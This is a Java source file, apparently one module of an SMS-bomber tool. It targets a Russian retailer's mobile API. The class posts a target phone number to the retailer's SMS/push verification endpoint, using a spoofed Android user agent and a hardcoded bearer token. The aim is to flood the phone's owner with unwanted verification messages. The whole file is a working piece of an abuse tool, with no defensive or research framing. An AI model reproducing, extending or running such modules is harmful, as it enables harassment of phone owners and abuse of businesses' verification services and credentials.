package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Ostin extends JsonService {

    public Ostin() {
        setUrl("https://mobileapp.ostin.com/v3/sms?layout=mobile_app&locale=ru-RU");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("User-Agent", "android/1.14.0");
        builder.addHeader("Authorization", "Bearer 865b8ecc7d774b6594d45f8c30fe5447");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("phone", "+" + getFormattedPhone());
            json.put("channel", "push");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
